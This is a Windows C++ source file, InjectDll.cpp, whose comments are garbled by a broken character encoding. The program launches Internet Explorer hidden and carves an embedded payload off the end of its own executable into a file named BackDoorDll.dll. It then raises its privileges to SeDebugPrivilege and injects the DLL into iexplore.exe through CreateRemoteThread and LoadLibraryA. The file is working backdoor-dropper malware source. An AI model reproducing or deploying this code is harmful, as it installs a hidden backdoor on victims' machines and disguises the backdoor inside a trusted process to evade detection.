// InjectDll.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <tlhelp32.h>
#include <stdio.h>
int EnableDebugPriv(const char * name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	//�򿪽������ƻ�
	if(!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
		&hToken) )
	{
		printf("OpenProcessToken error\n");
		return 1;
	}
	//��ý��̱���ΨһID
	if(!LookupPrivilegeValue(NULL,name,&luid))
	{
		printf("LookupPrivilege error!\n");
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes =SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	//��������Ȩ��
	if(!AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL) )
	{
		printf("AdjustTokenPrivileges error!\n");
		return 1;
	}
	return 0;
}

BOOL InjectDll(const char *DllFullPath, const DWORD dwRemoteProcessId)
{
	HANDLE hRemoteProcess;
	//��õ���Ȩ��
	if(EnableDebugPriv(SE_DEBUG_NAME))
	{
		printf("add privilege error");
		return FALSE;
	}
	//��Ŀ�����
	if((hRemoteProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwRemoteProcessId))==NULL)
	{
		printf("OpenProcess error\n");
		return FALSE;
	}
	char *pszLibFileRemote;
    //������dll�ļ�����·��
	pszLibFileRemote=(char *)VirtualAllocEx( hRemoteProcess, 
		                     NULL, lstrlen(DllFullPath)+1, 
		                     MEM_COMMIT, PAGE_READWRITE);
	if(pszLibFileRemote==NULL)
	{
		printf("VirtualAllocEx error\n");
		return FALSE;
	}
	//��dll������·��д�뵽�ڴ棬
	if(WriteProcessMemory(hRemoteProcess,
		pszLibFileRemote,(void *)DllFullPath,lstrlen(DllFullPath)+1,NULL) == 0)
	{
		printf("WriteProcessMemory error\n");
		return FALSE;
	}
	//�õ�LoadLibraryA������ַ
	PTHREAD_START_ROUTINE pfnStartAddr=(PTHREAD_START_ROUTINE)
		GetProcAddress(GetModuleHandle(TEXT("Kernel32")),"LoadLibraryA");
	if(pfnStartAddr == NULL)
	{
		printf("GetProcAddress error\n");
		return FALSE;
	}
	HANDLE hRemoteThread;
	//����Զ���߳�
	if( (hRemoteThread = CreateRemoteThread(hRemoteProcess,NULL,0, 
		pfnStartAddr,pszLibFileRemote,0,NULL))==NULL)
	{
		printf("CreateRemoteThread error\n");
		return FALSE;
	}
	return TRUE;
}

DWORD GetProcessID(char *ProcessName)
{
	PROCESSENTRY32 pe32;
	pe32.dwSize=sizeof(pe32);
	//���ϵͳ�����н��̿���
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot error");
		return 0;
	}
	//ö���б��еĵ�һ������
	BOOL bProcess=Process32First(hProcessSnap,&pe32);
	while(bProcess)
	{
		//�Ƚ��ҵ��Ľ�����������Ҫ���ҵĽ�������һ���򷵻ؽ���id
		if(strcmp(strupr(pe32.szExeFile),strupr(ProcessName))==0)
			return pe32.th32ProcessID;
		//��������
		bProcess=Process32Next(hProcessSnap,&pe32);
	}
	CloseHandle(hProcessSnap);
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char Path[256];
	char DllPath[256];
	//�õ�widnowsϵͳ·��
    GetSystemDirectory(Path,sizeof(Path));
	//0x00�ض��ַ����õ��̷�
	Path[3]=0x00;
	//�õ�IE��·���ļ���
	strcat(Path,"Program Files\\Internet Explorer\\iexplore.exe");
	//����IE��Ϊ�˷�ֹϵͳ��û��IE����
    WinExec(Path,SW_HIDE);
	//��ͣ���룬�ȴ�IE����
	Sleep(2000);
	//�õ�IE����
	DWORD Pid=GetProcessID("iexplore.exe");
	//�õ���������·��
	GetCurrentDirectory(sizeof(DllPath),DllPath);
	//�õ�DLL��·���ļ���
	strcat(DllPath,"\\BackDoorDll.dll");
    char szName[256];
	//�õ������ļ���
    GetModuleFileName(NULL,szName,256);
	//ֻ����ʽ�������ļ�
    HANDLE shFile=CreateFile(szName,GENERIC_READ,FILE_SHARE_READ,NULL,
		         OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(shFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//����DLL�ļ�
	HANDLE hFile=CreateFile(DllPath,GENERIC_WRITE,0,NULL,
		         CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//�ƶ��ļ�ָ�뵽DLL����
	if(SetFilePointer(shFile,-49152,NULL,FILE_END)==-1)
	{
		printf("SetFilePointer error\n");
		return 0;
	}
    char buff[2800]={0};
	DWORD dwRead;
	DWORD dwWrite;
	while(1)
	{
		//��ȡ2800�ֽ�
		if(!ReadFile(shFile,buff,2800,&dwRead,NULL))
		{
			printf("ReadFile error\n");
			return 0;	
		}
		if(dwRead<2800)
		{
			if(!WriteFile(hFile,buff,dwRead,&dwWrite,NULL))
			{
				printf("WriteFile error\n");
				return 0;	
			}
			break;
		}
		if(!WriteFile(hFile,buff,2800,&dwWrite,NULL))
		{
			printf("WriteFile error\n");
			return 0;
		}
	}
	CloseHandle(hFile);
	CloseHandle(shFile);
	//ע��IE����
    InjectDll(DllPath,Pid);
	return 0;
}



